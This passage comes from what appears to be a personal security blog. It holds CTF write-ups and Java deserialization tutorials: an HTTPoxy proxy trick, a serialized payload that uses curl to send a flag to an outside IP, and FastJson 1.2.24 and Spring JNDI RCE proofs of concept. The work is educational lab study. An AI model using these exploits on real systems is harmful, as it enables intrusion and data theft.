highlight_file($_GET['file']);&#125;if(isset($_GET['phpinfo'])) &#123; phpinfo();&#125; 存在文件读取，尝试/start.sh 开启了php-fpm，http://127.0.0.1:5000/api/eligible服务就是这个/srv/app.py提供的 123456789101112131415from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): current_year = int(datetime.datetime.now().strftime(\"%Y\")) if current_year &lt; 2050: return json.dumps(&#123;\"success\": False&#125;) else: return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') 代码没有漏洞，只能利用中间件 HTTPoxy漏洞（CVE-2016-5385） 需要返回的json数据中为True，可得flag 传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。 vps开个服务，flask默认5000 1234567891011from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') 添加 Proxy: http://174.0.222.203:5000 但是Linux靶机没flask模块，用SimpleHTTPServer模块 1234567891011121314from http.server import BaseHTTPRequestHandler, HTTPServerimport jsonclass DemoHttpServer(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200, message='OK') self.send_header('Content-Type', 'application/json') self.end_headers() self.wfile.write(json.dumps(&#123;\"success\": True&#125;).encode()) if __name__ == '__main__': server = HTTPServer(('0.0.0.0', 1234), DemoHttpServer) print('Server is running, user &lt;Ctrl+C&gt; to srop.') server.serve_forever() php也可，更方便 123$arr &#x3D; array(&quot;success&quot;&#x3D;&gt;true);header(&quot;Content-Type:application&#x2F;json&quot;);echo json_encode($arr); 当前目录启动php -S 0:2333 EasySpringMVC给了war包，解压， tools目录下的两个类都实现了Serializable，其中Tools类还定义了readObject()方法，在反序列化时会自动触发。 ClientInfo类是用户信息类。 ClentInfoFilter类中先判断cookie中是否存在cinfo字段， 没有的话实例化一个ClientInfo， 1cinfo &#x3D; new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId()); base64编码，调用Tools.create()进行序列化，并存入cookie。否则进行反序列化 也就是说，我们可以通过控制cookie从而控制反序列化的类，这里readObject()已经被重写了 1(new ProcessBuilder((String[])((String[])obj))).start(); 那么我们可以通过重写Tools类的writeObject()方法，返回一个字符串数组，从而命令执行 payload 123456789101112131415161718192021222324252627package com.tools;import java.io.*;import java.util.Base64;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; out.writeObject(cmd); &#125; public static void main(String[] args) throws Exception&#123; Base64.Encoder encoder = Base64.getEncoder(); Tools tools = new Tools(); byte[] bytes = Tools.create(tools); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 1rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQMAAHhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAKWN1cmwgaHR0cDovLzE3NC4wLjIyMy42NToyMzMzL2AvcmVhZGZsYWdgeA&#x3D;&#x3D; 一开始我不小心把下面的删了，导致一直失败。 private static final long serialVersionUID = 1L; 深入了解序列化writeObject、readObject、readResolve 参考链接 https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"Java反序列化漏洞-FastJson1.2.24","slug":"Java反序列化漏洞-FastJson1.2.24","date":"2020-03-01T05:47:37.000Z","updated":"2020-03-25T08:06:04.258Z","comments":true,"path":"2020/03/01/Java反序列化漏洞-FastJson1.2.24/","link":"","permalink":"https://glotozz.github.io/2020/03/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-FastJson1.2.24/","excerpt":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞","text":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 FastJson介绍 漏洞分析 POC 总结 参考链接 FastJson介绍下载 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;fastjson1224&lt;&#x2F;groupId&gt; &lt;artifactId&gt;test&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.24&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt; 序列化 1234567891011121314151617import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class FJTest &#123; public static void main(String[] args) &#123; Cat cat = new Cat(); cat.setName(\"gqy\"); //序列化 String json = JSON.toJSONString(cat); System.out.println(json); //设置SerializerFeature.WriteClassName可写入类名 String json1 = JSON.toJSONString(cat, SerializerFeature.WriteClassName); System.out.println(json1); //反序列化 System.out.println(JSON.parseObject(json1, Cat.class).getName()); &#125;&#125; 注释掉setName()和setAge() 12345String s &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;&#125;&quot;;Cat cat1 &#x3D; JSON.parseObject(s, Cat.class);System.out.println(cat1.getName()); &#x2F;&#x2F;nullCat cat2 &#x3D; JSON.parseObject(s, Cat.class, Feature.SupportNonPublicField);System.out.println(cat2.getName()); &#x2F;&#x2F;gqy 设置Feature.SupportNonPublicField即可支持对象类的private属性 新加一个属性properties,跟踪反序列化 12345678910111213141516171819202122232425import java.util.Properties;public class Cat &#123; private String name; private String age; private Properties properties; public String getName() &#123; return name; &#125; public Properties getProperties() &#123; System.out.println(\"getProperties\"); return properties; &#125; public String getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public Cat() &#123; &#125;&#125; 12String s1 &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;;Cat cat3 &#x3D; JSON.parseObject(s1, Cat.class, Feature.SupportNonPublicField); 结果为 12构造函数getProperties 漏洞分析漏洞触发点为 com.sun.org.apache.xalan.internal.xsltc.trax.Templates，但是这个包我在fastjson中没找到，却可以执行。 可以借助下面的网址查找jar https://www.findjar.com/ 在我jdk1.8.0._112的jre/lib/rt.jar中，也添加到libraries中即可 搜索getOutputProperties() 追踪Transformer 追踪getTransletInstance() 这里有一个实例化类，追踪defineTransletClasses() 从_bytecodes属性中加载类对象，并且上一步中要求这个对象继承AbstractTranslet 追踪ABSTRACT_TRANSLET常量为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet和前面的强制类转化相照应 利用链 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 构造我们需要的实例化对象 newInstance()会自动执行无参构造方法 123456789101112131415161718import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123; public Test()&#123; Runtime.getRuntime().exec(\"calc\"); &#125; //继承AbstractTranslet需要重写下面两个方法 public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; fastjson-remote-code-execute-poc 还有需要注意的一点，不能将类对象以字符流的形式传入，在JSONScanner中存在base64解码 POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\target\\\\classes\\\\person\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':&#123; &#125;,\" + \"\\\"_outputProperties\\\":&#123; &#125;&#125;\\n\"; System.out.println(text1); //String personStr = \"&#123;'name':\"+text1+\",'age':19&#125;\"; //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 总结上面其实只是fastjson反序列化的一种利用方式，还有基于JDNI（设置lookup属性）、基于ClassLoader（ 构造className为一个特殊的字符串时，通过这个类加载器来实现对自定义类的加载 ）的利用方式。 支持jdk1.7，1.8 该poc只能运行在fastjson-1.2.22到fastjson-1.2.24版本区间，因为fastjson从1.2.22版本才开始引入SupportNonPublicField。 不过此种利用方式需要在解析json串时设置Feature.SupportNonPublicField，而业务通常在使用fastjson时往往会直接按照默认参数调用parseObject()方法，所以略为鸡肋。 参考链接 http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java反序列化漏洞-Spring RCE","slug":"Java反序列化漏洞-Spring RCE","date":"2020-02-29T01:38:56.000Z","updated":"2020-03-25T08:05:56.044Z","comments":true,"path":"2020/02/29/Java反序列化漏洞-Spring RCE/","link":"","permalink":"https://glotozz.github.io/2020/02/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Spring%20RCE/","excerpt":"主要通过spring中的反序列化漏洞和FastJson反序列化漏洞学习java反序列化原理及利用","text":"主要通过spring中的反序列化漏洞和FastJson反序列化漏洞学习java反序列化原理及利用 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 基础知识 Spring反序列化漏洞 参考链接 基础知识为什么会有序列化和反序列化? 利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。 序列化需要满足的两个条件 该类必须实现java.io.Serializable接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 反序列化代码举例 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class SerializeTest &#123; public static void main(String[] args) &#123; Test test = new Test(); test.name = \"gqy\"; test.age = \"18\"; try&#123; // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(test); out.close(); fileOut.close(); System.out.println(\"Serialized data is saved!!\"); //反序列化提取对象 FileInputStream fileIn = new FileInputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // 建立对象输入流 ObjectInputStream in = new ObjectInputStream(fileIn); // 读取对象 Test test1 = null; test1 = (Test) in.readObject(); in.close(); fileIn.close(); System.out.println(test1.name); test1.eat(); &#125;catch (IOException | ClassNotFoundException i)&#123; i.printStackTrace(); &#125; &#125;&#125; 查看下序列化后的数据，只能看到不完整的信息 反序列化漏洞demo 在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。 PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 1234567891011121314151617181920212223242526272829303132import java.io.*;public class test&#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = \"hacked by ph0rse\"; FileOutputStream fos = new FileOutputStream(\"object\"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"object\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; 主要是这里的重写了readObject() 漏洞起源 重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。 使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。 基础库中隐藏的反序列化漏洞 2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。存在危险的基础库： 123456789101112commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9org.springframework:spring-aop 4.1.4.RELEASE Spring反序列化漏洞首先需要了解JAVA体系中的RMI以及JNDI RMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message Protocol，Java远程消息交换协议）以及CORBA。 JNDI (Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等。 简单说就是RMI注册的服务可以让JNDI应用程序来访问。 JNDI RCE漏洞产生的原因就在于当我们在注册RMI服务时，可以指定codebase url，也就是远程要加载类的位置，设置该属性可以让JDNI应用程序在加载时加载我们指定的类 ( 例如：http://www.iswin.org/xx.class) ，这里还有一个比较重要的点，也是触发恶意代码的点，当JNDI应用程序通过lookup(rmi服务的地址)调用指定codebase url上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。 RMI测试demo 1234567Registry registry &#x3D; LocateRegistry.createRegistry(1999);&#x2F;&#x2F; 设置code url 这里即为http:&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&#x2F;&#x2F; 最终下载恶意类的地址为http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;ExportObject.classReference reference &#x3D; new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&quot;);&#x2F;&#x2F; Reference包装类ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);registry.bind(&quot;Object&quot;, referenceWrapper); 1999端口注册了RMI服务，设置code url为http://http://127.0.0.1:8000/，实际类加载位置为http://127.0.0.1:8000/ExportObject.class，绑定了Object，JNDI调用的地址为http://127.0.0.1:8000/Object 控制了恶意类ExportObject就能RCE JNDI测试demo Persion类 1234567891011121314151617181920212223242526272829303132333435363738import java.io.IOException;import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote,Serializable &#123; private static final long serialVersionUID = 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String toString()&#123; return \"name:\"+name+\" password:\"+password; &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; 服务端rmi为例 1234567891011121314151617181920212223242526272829303132333435363738import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class Test3 &#123; public static void initPerson() throws Exception&#123; //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 //配置rmi LocateRegistry.createRegistry(3001); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:3001\"); ////初始化 InitialContext ctx = new InitialContext(); //实例化person对象 Person p = new Person(); p.setName(\"hello\"); p.setPassword(\"jndi\"); //person对象绑定到JNDI服务中，JNDI的名字叫做：person。 ctx.bind(\"person\", p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了 InitialContext ctx = new InitialContext(); //通过lookup查找person对象 Person person = (Person) ctx.lookup(\"person\"); //打印出这个对象 System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; 本来是读取person类的信息，在person类中加上了readObject()方法，成功RCE Jndi注入产生的原因 1、lookup参数可控。 2、InitialContext类及他的子类的lookup方法允许动态协议转换 3、lookup查找的对象是Reference类型及其子类 4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。 跟进lookup() 跟进getURLOrDefaultInitCtx(name) 即使一开始设置了Context，也是可以重写为我们传入的lookup()的参数 举例 12345678&#x2F;&#x2F; Create the initial contextHashtable env &#x3D; new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;secure-server:1099&quot;);Context ctx &#x3D; new InitialContext(env);&#x2F;&#x2F; Look up in the local RMI registryObject local_obj &#x3D; ctx.lookup(&lt;attacker controlled&gt;); Spring RCE Spring RCE形成的主要原因是 Spring框架的spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager 存在一个readObject方法。当执行对象反序列化的时候，会执行lookup操作，导致了jndi注入，可以导致远程代码执行问题 环境搭建+POC mvn install出现报错[ERROR] 不再支持源选项 5。请使用 6 或更高版本。 pom.xml中增加maven编译的jdk版本设置 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.3&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;&#x2F;configuration&gt;&lt;&#x2F;plugin&gt; 发现还是没用,Terminal里面的java版本始终是java11 解决办法：help–&gt;find action ，输入switch boot jdk，切换成自己的jdk即可 把jar包下载下来，分析一下源码 利用idea自带的反编译，add as library，注意最好添加为Global，否则可能会找不到类 org.springframework.transaction.jta.JtaTransactionManager 当一个类被反序列化时会调用该类的readObject()方法，跟进initUserTransactionAndTransactionManager()方法 跟进lookupUserTransaction() 调用JndiTemplate.lookup()，追踪lookup() 跟进lookup() 总结一下调用链 JtaTransactionManager-&gt;readObject()-&gt;initUserTransactionAndTransactionManager() -&gt;lookupUserTransaction(this.userTransactionName)，这里的userTransactionName是我们可控的（setUserTransactionName()），最终触发 JndiTemplate的lookup(userTransactionName)触发RCE。我们需要注册一个rmi服务，并提供恶意类。 漏洞实现 客户端demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package client.src.main.java;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.InetSocketAddress;import java.net.Socket;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import org.springframework.transaction.jta.JtaTransactionManager;import com.sun.jndi.rmi.registry.ReferenceWrapper;import com.sun.net.httpserver.HttpServer;/*** * * @author admin@iswin.org * @time 2016.1.24 */@SuppressWarnings(\"restriction\")public class ExploitClient &#123; /*** * 启动http服务器，提供下载远程要调用的类 * * @throws IOException */ public static void lanuchCodebaseURLServer() throws IOException &#123; System.out.println(\"Starting HTTP server\"); HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0); httpServer.createContext(\"/\", new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); &#125; /*** * 启动RMI服务 * * @throws Exception */ public static void lanuchRMIregister() throws Exception &#123; System.out.println(\"Creating RMI Registry\"); Registry registry = LocateRegistry.createRegistry(1999); // 设置code url 这里即为http://http://127.0.0.1:8000/ // 最终下载恶意类的地址为http://127.0.0.1:8000/ExportObject.class Reference reference = new Reference(\"ExportObject\", \"ExportObject\", \"http://127.0.0.1:8000/\"); // Reference包装类 ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Object\", referenceWrapper); &#125; /*** * 发送payload * * @throws Exception */ public static void sendPayload() throws Exception &#123; // jndi的调用地址 String jndiAddress = \"rmi://127.0.0.1:1999/Object\"; // 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量 JtaTransactionManager object = new JtaTransactionManager(); object.setUserTransactionName(jndiAddress); // 发送构造好的payload Socket socket = new Socket(\"127.0.0.1\", 9999); System.out.println(\"Sending object to server...\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); socket.close(); &#125; public static void main(String[] args) throws Exception &#123; lanuchCodebaseURLServer(); lanuchRMIregister(); sendPayload(); &#125;&#125; 服务端 123456789101112131415161718192021222324252627package server.src.main.java;import java.io.*;import java.net.*;public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; int port = 9999; ServerSocket serverSocket = new ServerSocket(port); System.out.println(\"Server started on port \"+serverSocket.getLocalPort()); while(true) &#123; Socket socket=serverSocket.accept(); System.out.println(\"Connection received from \"+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; Object object = objectInputStream.readObject(); System.out.println(\"Read object \"+object); &#125; catch(Exception e) &#123; System.out.println(\"Exception caught while reading object\"); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; payload 123456789101112131415import sun.awt.windows.ThemeReader;public class ExportObject &#123; public ExportObject() &#123; try &#123; while(true) &#123; System.out.println(\"running injected code...\"); Runtime.getRuntime().exec(\"calc.exe\"); Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 切换java版本为1.8.0_112，成功 不过这只是模拟了漏洞的触发过程，客户端也就是攻击端，开个http服务8000，注册rmi服务到8000上，并绑定恶意类。然后开个socket服务发送payload到9999端口，这里的payload是就是将JtaTransactionManager反序列化，并设置object.setUserTransactionName(jndiAddress);。String jndiAddress = &quot;rmi://127.0.0.1:1999/Object&quot;;，实际查找位置为前面rmi绑定的http://127.0.0.1:8000/Object。 服务端就是开个socket服务从9999端口接受数据，并进行反序列化，自动触发readobject()，然后最终触发lookup()，jndi访问我们注册的rmi服务，触发恶意类的构造函数。 利用条件 1、存在接口进行序列化操作 2、访问对象可以出网 3、目标对象中的CLASSPATH存在Sping-tx-xxx.jar 总结 Spring-tx-xx.jar文件不是中间件的默认组件，所以，该漏洞就比较鸡肋 。 实际工程中可能会存在将缺陷jar文件放在中间件的类加载器中的情况， 即所有应用都可以访问这个jar，那么漏洞就可以利用 PS：本来想把Fastjson反序列化漏洞也写在这里的，但是防止篇幅过长，另写一篇🤦‍♂️ 参考链接 https://xz.aliyun.com/t/2041 https://www.freebuf.com/vuls/115849.html https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"java审计入门","slug":"java审计入门","date":"2020-02-28T00:48:22.000Z","updated":"2020-03-25T08:04:35.880Z","comments":true,"path":"2020/02/28/java审计入门/","link":"","permalink":"https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/","excerpt":"开始学java🏃‍♀️","text":"开始学java🏃‍♀️ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 准备工作 WebGoat 8 开始审计 SqlInjection 参考链接 一般面试都会问到java漏洞了解嘛，会分析🐴，但我一般都是利用现成工具或者exp。趁还没开学时间比较多，学习一下java代码审计。 准备工作安装 运行java程序：先编译a.java=&gt;a.class，因此.class结尾的字节码文件需要反编译，工具我一般用jadx java平台：java se，java ee，java me，主要学习第二个web服务 常见的java服务器： Tomcat、Weblogic、JBoss、GlassFish ，主要学习Tomcat Tomcat目录结构 Tomcat部署源码 javapms为例 以SpringMVC+Spring+Hibernate+Freemarker+Html5+jQuery为技术核心架构 IDEA 导入项目并添加tomcat配置 IDEA调试功能 当前项目结构不太懂，不知道如何下放断点，跳过 Maven-项目管理和构建工具 Maven是一种自动构建项目的方式，可以帮助我们自动从本地和远程仓库拉取关联jar包。 部署WebGoat为例，导入项目 完成之后background就开始下载，但是速度 Fortify 代码审计工具 暂时先也不用 WebGoat 8 WebGoat8是基于Spring boot框架开发,故意不安全的Web应用程序，旨在教授Web应用程序安全性课程。 需要的环境：java 11、Maven &gt; 3.2.1、IDEA 安装 1234git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.gitcd WebGoatmvn clean package -Dmaven.test.skip&#x3D;truemvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true 因为我有个包下载失败了就跳过这个包 最后是如下的界面 import WebGoat到IDEA 进行代码查看及调试 发现已经配置好了 组件安全 也暂时跳过 Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序 。 项目地址以及参考教程 开始审计第一个页面是登录，登录是很容易存在漏洞的功能点之一。 没学过Spring boot框架，既然路由是/login，全局搜索login 找到org/owasp/webgoat/WebSecurityConfig.java 大致能看懂，但是漏洞看不出来==，先看下面这个类似认证的方法 查阅AuthenticationManagerBuilder auth ，允许轻松构建内存身份验证，LDAP身份验证，基于JDBC的身份验证，添加UserDetailsService以及添加AuthenticationProvider。 那么追踪userDetailsService 1private final UserService userDetailsService; 追踪UserService 和文章一样，userRepository.findByUsername(username)猜测是数据库查询， 追踪 是个接口，追踪 还是个接口，实现了更多方法，继续追踪，最后到Repository接口我也没找到实现这个接口的代码 这是个导入的包，看来已经高度集成，那么只需要知道其用法即可 [Spring Boot 揭秘与实战（二）] 实体对象 创建一个 Author 实体，真实的表名是 t_author，包含 id（自增主键）、 realName、 nickname 字段。 123456789101112131415@Entity@Table(name &#x3D; &quot;t_author&quot;)public class Author&#123; @Id @GeneratedValue(strategy &#x3D; GenerationType.AUTO) private Long id; @Column(name&#x3D;&quot;real_name&quot;) private String realName; 